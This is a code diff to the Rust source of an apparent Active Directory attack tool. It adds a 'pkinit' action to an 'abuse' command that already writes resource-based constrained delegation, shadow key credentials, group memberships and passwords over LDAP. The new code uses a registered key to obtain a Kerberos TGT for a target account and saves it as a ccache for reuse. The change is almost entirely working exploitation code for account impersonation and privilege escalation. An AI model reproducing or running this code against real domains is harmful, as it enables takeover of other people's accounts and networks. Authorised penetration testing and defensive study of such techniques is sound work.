@@ -88,23 +88,32 @@ struct CoerceArgs {
 
 #[derive(Parser)]
 struct AbuseArgs {
+    /// LDAP URL (required for the LDAP-write actions; unused by `pkinit`)
     #[arg(long)]
-    url: String,
+    url: Option<String>,
     #[arg(long)]
-    user: String,
+    user: Option<String>,
     #[arg(long)]
-    password: String,
+    password: Option<String>,
     #[arg(long)]
     insecure: bool,
-    /// add-spn | add-member | set-password
+    /// add-spn | add-member | set-password | add-keycred | write-rbcd | pkinit
     #[arg(long)]
     action: String,
-    /// Target sAMAccountName (the object to modify; the group for add-member)
+    /// Target sAMAccountName (the object to modify; the group for add-member; the account
+    /// to authenticate as for `pkinit`)
     #[arg(long)]
     target: String,
-    /// Value: the SPN, the member sAMAccountName, or the new password
-    #[arg(long)]
+    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
+    /// the key .pem path — defaults to `<target>.key.pem`
+    #[arg(long, default_value = "")]
     value: String,
+    /// Kerberos realm (pkinit)
+    #[arg(long)]
+    realm: Option<String>,
+    /// KDC host[:port] (pkinit)
+    #[arg(long)]
+    kdc: Option<String>,
 }
 
 #[derive(Parser)]
@@ -236,10 +245,27 @@ async fn coerce(a: CoerceArgs) -> Result<()> {
 
 /// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
 async fn abuse(a: AbuseArgs) -> Result<()> {
+    // pkinit is a KDC exchange, not an LDAP write — handle it before touching LDAP.
+    if a.action == "pkinit" {
+        let realm = a.realm.clone().context("pkinit needs --realm")?;
+        let kdc = a.kdc.clone().context("pkinit needs --kdc")?;
+        let key_path = if a.value.is_empty() { format!("{}.key.pem", a.target) } else { a.value.clone() };
+        let pem = std::fs::read_to_string(&key_path)
+            .with_context(|| format!("read key {key_path}"))?;
+        let tgt = adhammer_kerberos::pkinit::pkinit_authenticate(&a.target, &realm, &kdc, &pem).await?;
+        let cc_path = format!("{}.ccache", a.target);
+        std::fs::write(&cc_path, &tgt.ccache)?;
+        println!("[+] PKINIT succeeded — TGT for {}@{} (via {})", a.target, realm, tgt.sname);
+        println!("    reply key derived from DH + AS-REP enc-part decrypted (holder of the registered key)");
+        println!("    ticket valid until {}", tgt.end_time);
+        println!("    ccache saved to {cc_path}  (export KRB5CCNAME={cc_path})");
+        return Ok(());
+    }
+
     let cfg = LdapConfig {
-        url: a.url.clone(),
-        bind_dn: a.user.clone(),
-        password: a.password.clone(),
+        url: a.url.clone().context("this action needs --url")?,
+        bind_dn: a.user.clone().context("this action needs --user")?,
+        password: a.password.clone().context("this action needs --password")?,
         base_dn: None,
         insecure: a.insecure,
         gssapi: false,
@@ -281,7 +307,7 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
             println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
         }
-        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred)"),
+        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred|pkinit)"),
     }
     Ok(())
 }
